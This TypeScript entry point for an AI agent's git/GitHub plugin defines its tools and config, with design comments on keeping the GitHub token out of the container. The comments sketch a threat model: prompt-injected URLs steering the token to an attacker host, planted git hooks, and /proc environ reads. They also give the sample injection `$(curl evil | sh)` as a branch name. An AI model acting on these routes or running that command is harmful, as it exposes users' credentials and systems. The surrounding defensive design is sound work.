import { definePlugin } from "@dynamicagents/core";
import type { AgentPlugin } from "@dynamicagents/core";
import { repoContext } from "./context.js";
import { checkTools } from "./tools-checks.js";
import { cloneTools } from "./tools-clone.js";
import { prActions, prTools } from "./tools-pr.js";
import { reviewActions, reviewTools } from "./tools-review.js";
import { worktreeTools } from "./tools-worktree.js";
import { worktreesTools } from "./tools-worktrees.js";

/**
 * The URL parsing, re-exported from the one entry point.
 *
 * `parseRepo` is a host's own tool for deriving a per-repository workspace name
 * from a clone URL — the README tells it to — so the subpath carries it even
 * though it is implemented in `url.ts`.
 */
export { parseRepo } from "./url.js";

export { graphqlEndpoint, truncateOutput } from "./context.js";

/**
 * `@dynamicagents/plugins/repo` — clone, commit, push, open a pull request.
 *
 * Layered over a container rather than owning one: it needs a shell with `git`
 * on it, and `@dynamicagents/plugins/workspace` provides exactly that through
 * `workspaceExec`. Passing `exec` in rather than importing that plugin keeps the
 * two independent — a host with its own container can use this against that
 * instead, and the tests here need no container at all.
 *
 * ## The credential never enters the container
 *
 * The three operations that authenticate — clone, fetch, push — are not run
 * here. They go to {@link RepoConfig.git}, which the host implements on its own
 * side of the boundary. Everything else — `status`, `diff`, `add`, `commit`,
 * `checkout` — runs in the container through {@link RepoConfig.exec}, because
 * none of it needs to authenticate.
 *
 * That split is the one thing to preserve when changing this file: if an
 * operation talks to GitHub it does not belong on `exec`, and if it does not,
 * it has no business anywhere else.
 *
 * It is absolute rather than careful because a narrower version does not hold.
 * Git executes whatever `.git/config` and `.git/hooks` name; both live in the
 * workspace filesystem, which outlives the container and which a co-installed
 * shell tool can write. So a model needs no credential on its *own* command — a
 * planted `pre-push` hook reads one out of the environment `repo_push` gives it.
 * Nor is that patchable key by key: a URL-specific `http.<url>.sslVerify=false`
 * in the repository's own config beats a `-c` override, because specificity
 * outranks precedence. And a credential that exists in a process environment for
 * the length of one command is readable at `/proc/<pid>/environ` by anything
 * else in the container.
 *
 * Two further rules, which are about GitHub rather than the container:
 *
 * 1. **GitHub's hosts are an allowlist, checked before anything runs.** A clone URL is
 *    model input — a repository README, an issue body, or a page fetched by a
 *    co-installed browser plugin is enough to choose it — and a credential
 *    offered to a host of the model's choosing is the whole game. So the URL's
 *    host must be on {@link RepoConfig.allowedHosts} before any operation
 *    starts, and the allowlist travels with each call so the host can bind the
 *    check to the moment the token would actually be handed over. `origin` is
 *    re-derived and re-checked on every push rather than remembered, because the
 *    checkout's `.git/config` is a file the container can rewrite.
 * 2. **The GitHub API is called from the Worker**, so the credential that can
 *    write to a repository through the API never crosses the boundary either.
 *    Every tool that reads or writes through it resolves the repository from the
 *    checkout's own origin rather than from a parameter, so there is no way to
 *    point the token at a repository nobody asked about.
 *
 * Model-authored values — URLs, branch names, commit messages — travel to the
 * container as environment variables rather than being interpolated into a
 * command, so a branch name of `$(curl evil | sh)` is inert text. That is about
 * shell injection, not credentials, and is independent of all of the above.
 *
 * A limit this plugin cannot close: the allowlist bounds the *host*, never the
 * repository. Whatever the token can reach, an agent talked into naming it can
 * reach. See the README — the token wants to be fine-grained.
 */

/** Run one command in the host's container. Matches `workspaceExec`'s shape. */
export type RepoExec = (
  command: string,
  options?: {
    cwd?: string;
    env?: Record<string, string | undefined>;
    timeout?: number;
    /**
     * The running sub-agent's `runtime()`, forwarded **opaquely**.
     *
     * This plugin never looks inside it. A sub-agent has to reach the
     * container its parent prepared, and the key for that lives in what the
     * parent's `prepare` returned — but decoding it is the container plugin's
     * business, not git's. Passing it through untouched is what lets the two
     * plugins compose without either importing the other, which is the whole
     * reason `exec` is injected rather than imported.
     */
    runtime?: unknown;
  }
) => Promise<{
  success: boolean;
  stdout: string;
  stderr: string;
  exitCode: number;
}>;

/**
 * The three git operations that need the GitHub token, run by the host.
 *
 * Injected for the same reason {@link RepoExec} is — this plugin owns the
 * policy, not the plumbing — but the split between the two is not arbitrary. It
 * is the trust boundary. Everything reachable through `exec` runs in the
 * container and gets **no credential**; everything here runs wherever the host
 * keeps its secret and never touches the container at all.
 *
 * That is why `clone`, `fetch` and `push` are the whole interface. They are
 * exactly the operations that talk to GitHub. `status`, `diff`, `add`,
 * `commit` and `checkout` are local, need nothing to authenticate with, and stay
 * on `exec` where they are cheap and where the model can see them work.
 *
 * A host implements this against whatever git it has on its own side of the
 * boundary. The coder in `starter` runs isomorphic-git inside the
 * Durable Object that owns the workspace filesystem, so a push reads the token
 * from that object's environment and the container never holds one.
 *
 * ## Failures arrive as values
 *
 * No method here rejects for a git failure. A remote that refuses a push, a
 * branch that does not resolve, a repository that is not there — all of it comes
 * back as `ok: false`, because those are answers. A rejection means the host
 * itself could not be reached, which is a different fact and gets a different
 * sentence from every tool in this file. See
 * {@link file://./context.ts RunResult}.
 */
export interface RepoGit {
  /**
   * Put a checkout at `dir`, on `branch` or the remote's default.
   *
   * `detail` is the branch it landed on — the caller cannot know it in advance
   * when `branch` is omitted, and asking git afterwards would be a second round
   * trip for something the clone already had in its hand.
   */
  clone(req: {
    url: string;
    dir: string;
    allowedHosts: string[];
    branch?: string;
    depth?: number;
  }): Promise<RepoGitResult>;
  /** Update remote-tracking refs for the checkout at `dir`. */
  fetch(req: {
    url: string;
    dir: string;
    allowedHosts: string[];
    depth?: number;
  }): Promise<RepoGitResult>;
  /**
   * Push `branch` to the same-named branch on the remote.
   *
   * Never a force push and never a refspec: the caller has already refused
   * anything that is not a plain branch name, and this signature is the other
   * half of that promise — there is no parameter here with which to ask for one.
   */
  push(req: {
    url: string;
    dir: string;
    branch: string;
    allowedHosts: string[];
  }): Promise<RepoGitResult>;
  /**
   * The checkout's `origin` URL, read on the host's side; `undefined` for none.
   *
   * Optional. Set, the GitHub tools resolve their repository without the
   * container, so an agent polling a pull request does not keep one running.
   * Unset, the origin is read through {@link RepoConfig.exec}.
   */
  origin?(dir: string): Promise<string | undefined>;
}

/** What a {@link RepoGit} operation reports. */
export type RepoGitResult =
  { ok: true; detail: string } | { ok: false; code?: string; message: string };

export interface RepoConfig {
  /**
   * Runs commands in the container holding the checkout.
   *
   * Uncredentialed, always. Nothing this runs is ever given the GitHub token —
   * see {@link RepoGit} for the operations that need one.
   */
  exec: RepoExec;
  /** Runs the three credentialed operations, on the host's side of the boundary. */
  git: RepoGit;
  /**
   * A GitHub token with contents+pull-request write. A thunk so a rotated secret
   * is picked up without rebuilding the plugin list.
   */
  token: () => string;
  /** Where clones land. Defaults to `/workspace`. */
  workdir?: string;
  /** API origin, for GitHub Enterprise. Defaults to the public API. */
  apiBase?: string;
  /** Committer identity. Defaults to a generic agent identity. */
  author?: { name: string; email: string };
  /**
   * Hosts a clone may target, lowercase and exact. Defaults to `github.com`.
   *
   * A fail-closed allowlist rather than a blocklist, because the failure it
   * prevents is credential exfiltration and the input is model-chosen. Widen it
   * for GitHub Enterprise (alongside `apiBase`); an empty array clones nothing.
   */
  allowedHosts?: string[];
  /**
   * Ceiling on what any one tool here returns to the model, in **characters**.
   * Defaults to 16,000, matching the computer plugin.
   *
   * Characters, not bytes: `truncateOutput` budgets with `String.length`, so
   * 16,000 non-ASCII characters is three times that many UTF-8 bytes.
   *
   * `repo_diff` is the main input for an agent that
   * reviews rather than writes — a coder whose sub-agents hold the shell — and
   * an unbounded diff on a large change is precisely the context blowup that
   * design exists to prevent.
   */
  maxOutputChars?: number;
  /**
   * Called after a checkout is in place, freshly cloned or refreshed onto a new
   * commit.
   *
   * The hook exists because "there is now a working tree at this path" is
   * knowledge only this plugin has, and "that tree needs its dependencies
   * installed" is a decision only the host can make. Keeping the two apart is
   * what stops a git plugin growing an opinion about npm — the host wires this
   * to whatever its runtime does, or leaves it unset and nothing changes.
   *
   * **Record {@link RepoCheckout.dir} here, and record it on its own.** Installing
   * is the use this hook was written for, and it is not the only obligation:
   * `dir` is reported nowhere else, so a host that does not persist it has no
   * way to answer "where is the checkout" afterwards. Persisting it *as part of*
   * an install is the trap, because an install is conditional and the checkout is
   * not — a host that stored the path alongside its install state found that a
   * repository the resolver had nothing to install in (no `package.json`) cloned
   * perfectly, reported itself correctly, and could never be worked in, because
   * the one path its sub-agents needed was written on a branch that never ran.
   *
   * Awaited, so it can record intent durably, but it must **return quickly**:
   * it runs inside `repo_clone`, which runs inside a model turn. A host that
   * wants to install here should start a job and return, not wait for it.
   *
   * A throw is caught and logged rather than failing the clone. The checkout did
   * succeed, the model needs to be told so, and a follow-up that did not is the
   * host's to notice.
   */
  afterCheckout?: (checkout: RepoCheckout) => Promise<void>;
  /**
   * Called with the repository a clone is *about* to target, after the host
   * allowlist has passed and before any git runs.
   *
   * Separate from {@link afterCheckout} because it answers a different question,
   * and the ordering is the whole point. A host that keys its container or its
   * filesystem per repository has to know which one **before** the clone, or the
   * clone lands somewhere it will then have to be moved from. `afterCheckout`
   * is far too late for that: by then the files exist.
   *
   * Synchronous on purpose. It runs on the path of every clone and the only
   * sensible thing to do with it is record a selection, which is why it returns
   * nothing and cannot be awaited — a host that needs to do I/O here has the
   * ordering wrong.
   *
   * A throw **fails the clone**, unlike {@link RepoConfig.afterCheckout}, whose
   * throw is caught and logged. A host that cannot choose a workspace has not
   * chosen one, and cloning into whichever was already open is worse than not
   * cloning.
   */
  beforeCheckout?: (target: {
    url: string;
    host: string;
    owner: string;
    repo: string;
  }) => void;
  /**
   * The worktrees a host keeps for its sub-agents' work, and the way between
   * them.
   *
   * Set, the plugin offers `repo_worktrees` and `repo_worktree`. A switch moves
   * the installing agent's own tools, so a host sets this on the parent's
   * install and never on a sub-agent's. See {@link RepoWorktrees}.
   */
  worktrees?: RepoWorktrees;
  /**
   * The tools this install offers, and with them the lines of context that
   * describe them. Unset, every tool. A selection rather than core's
   * `restrictTools`, which drops a plugin's context whole: an agent that
   * coordinates others' work reads about the tools it has and no others.
   */
  tools?: readonly RepoToolName[];
}

/** Every tool and action this plugin can offer, by the name the model sees. */
export const REPO_TOOL_NAMES = [
  "repo_clone",
  "repo_fetch",
  "repo_status",
  "repo_diff",
  "repo_commit",
  "repo_push",
  "repo_open_pr",
  "repo_issue_view",
  "repo_pr_view",
  "repo_pr_comment",
  "repo_pr_review_status",
  "repo_pr_threads",
  "repo_pr_thread_reply",
  "repo_pr_checks",
  "repo_worktrees",
  "repo_worktree"
] as const;

export type RepoToolName = (typeof REPO_TOOL_NAMES)[number];

/**
 * Checkouts a host keeps apart from the main one — each holding a branch its
 * writing sub-agents committed on — and the switch that points every repo tool
 * at one of them.
 *
 * The host renders every answer: which worktrees exist, where their checkouts
 * sit and what is safe to do in them are its facts, and a sentence is what the
 * model reads.
 */
export interface RepoWorktrees {
  /** Every worktree, with its branch and state. */
  list(): Promise<string>;
  /**
   * Point every repo tool — and whatever else the host routes the same way — at
   * the worktree holding `branch`, or back at the main checkout when it is absent.
   * Answers what the model now has in front of it.
   *
   * The switch holds until the next one. This answer is what the model
   * remembers, so a host that moves the tools on its own says so where the
   * model reads it every turn.
   */
  use(branch?: string): Promise<string>;
  /** Give up `branch`'s worktree, and the unpushed work in it. */
  release(branch: string): Promise<string>;
}

/** What {@link RepoConfig.afterCheckout} is told about a checkout. */
export interface RepoCheckout {
  /**
   * Absolute path of the working tree.
   *
   * The only report of it there is. Nothing in this plugin holds state, so a
   * host that does not persist this cannot find the checkout again — and must
   * persist it unconditionally rather than as a side effect of whatever else the
   * hook does. See {@link RepoConfig.afterCheckout}.
   */
  dir: string;
  /** The clone URL, already allowlist-checked. */
  url: string;
  /** Host it came from, lowercase. */
  host: string;
  /**
   * `owner/repo`.
   *
   * Always present: a URL that does not parse into one is refused before any git
   * runs, so a host keying anything per repository can rely on it rather than
   * inventing a fallback.
   */
  repo: string;
  /** Branch the checkout is on. */
  branch: string;
  /** True for a first clone, false when an existing tree was refreshed. */
  fresh: boolean;
}

/**
 * No tool here is held for a person's approval — see this plugin's README for
 * why, and for what a fork that wants one does instead.
 */
export function repo(config: RepoConfig): AgentPlugin {
  const selected = new Set<string>(config.tools ?? REPO_TOOL_NAMES);
  const has = (name: RepoToolName) => selected.has(name);
  const only = <T>(all: Record<string, T>): Record<string, T> =>
    Object.fromEntries(
      Object.entries(all).filter(([name]) => selected.has(name))
    );
  const views = [
    has("repo_issue_view") &&
      "`repo_issue_view` reads an issue or pull request with its comments",
    has("repo_pr_view") &&
      "`repo_pr_view` shows a pull request's state and the files it touches",
    has("repo_pr_comment") && "`repo_pr_comment` leaves a comment"
  ].filter((line): line is string => typeof line === "string");
  const worktrees = config.worktrees && [
    has("repo_worktrees") &&
      "`repo_worktrees` lists the worktrees your writing sub-agents committed in — each one's branch, whether a session is still in it, whether its commits are pushed — and releases one you will not keep.",
    has("repo_worktree") &&
      "`repo_worktree` points every repo tool and your file reads at the worktree holding a branch, and they stay there until you call it again — with no branch to come back to your own checkout."
  ];
  const lines = [
    has("repo_clone") &&
      "`repo_clone` checks one out into the workspace. The checkout may already be there from an earlier task, in which case it is fetched and reset for you" +
        (has("repo_diff")
          ? " — but if it has uncommitted changes it is left as-is, and you should read them with `repo_diff` before deciding what to do."
          : "."),
    has("repo_fetch") &&
      "`repo_fetch` brings a checkout's remote branches in without touching its tree" +
        (has("repo_diff")
          ? " — how you review a branch someone else pushed, as `origin/<branch>` with `repo_diff`."
          : "."),
    has("repo_status") &&
      has("repo_diff") &&
      "`repo_status` and `repo_diff` show what you have changed — read the diff before committing. On a large change call `repo_diff` with `stat: true` first to see which files moved, then read the ones that matter; output is truncated from the middle when it is large.",
    has("repo_status") &&
      !has("repo_diff") &&
      "`repo_status` shows what you have changed.",
    !has("repo_status") &&
      has("repo_diff") &&
      "`repo_diff` shows what changed. On a large change call it with `stat: true` first to see which files moved, then read the ones that matter; output is truncated from the middle when it is large.",
    has("repo_commit") && "`repo_commit` stages everything and commits.",
    has("repo_push") &&
      "`repo_push` pushes a branch the checkout holds, or creates one at the current commit. It refuses the default branch and other protected names, and it refuses a branch that adds no commit the remote does not already have — that is not negotiable.",
    has("repo_open_pr") &&
      "`repo_open_pr` opens the pull request and returns its URL.",
    views.length > 0 &&
      `${views.join(", ")}. ${views.length > 1 ? "Each acts" : "It acts"} on the repository you have checked out — read the issue a task refers to before guessing what it asks for.`,
    has("repo_pr_review_status") &&
      "`repo_pr_review_status` says whether a reviewer has finished. Ask it before reading a review: one that has not landed has left nothing, so an empty list of threads means nothing yet rather than nothing to do.",
    has("repo_pr_threads") &&
      "`repo_pr_threads` reads the review threads — the comments left on particular lines, which are not on the " +
        (has("repo_issue_view")
          ? "timeline `repo_issue_view` shows."
          : "pull request's timeline.") +
        (has("repo_pr_thread_reply")
          ? " `repo_pr_thread_reply` answers one and resolves it. Answer every thread: say what you changed and where, or why you did not, and resolve it either way so the record says what happened."
          : ""),
    has("repo_pr_thread_reply") &&
      !has("repo_pr_threads") &&
      "`repo_pr_thread_reply` answers a review thread and resolves it. Answer every thread: say what you changed and where, or why you did not, and resolve it either way so the record says what happened.",
    has("repo_pr_checks") &&
      "`repo_pr_checks` says how a pull request's CI stands on its latest commit: what is still running, what failed and where to read why, and what passed.",
    ...(worktrees || [])
  ].filter((line): line is string => typeof line === "string");
  const rules = [
    has("repo_push") && "Never push to the default branch.",
    has("repo_open_pr") &&
      "Finish by opening a pull request and reporting its URL."
  ].filter((line): line is string => typeof line === "string");
  const context = [
    "You can work with git repositories:",
    ...lines.map((line) => `- ${line}`),
    ...(rules.length > 0 ? [rules.join(" ")] : [])
  ].join("\n");

  return definePlugin({
    name: "repo",

    // `runtime` goes through to `exec` untouched and is read per command, so a
    // sub-agent's git commands run in the same container its parent cloned
    // into.
    tools: (ctx) => {
      const repoCtx = repoContext(config, ctx.runtime);
      return only({
        ...cloneTools(repoCtx),
        ...worktreeTools(repoCtx),
        ...prTools(repoCtx),
        ...reviewTools(repoCtx),
        ...checkTools(repoCtx),
        ...(config.worktrees ? worktreesTools(config.worktrees) : {})
      });
    },

    actions: (ctx) => {
      const repoCtx = repoContext(config, ctx.runtime);
      return only({ ...prActions(repoCtx), ...reviewActions(repoCtx) });
    },

    context: [{ provider: { get: async () => context } }],

    requires: { secrets: ["GITHUB_TOKEN"] }
  });
}
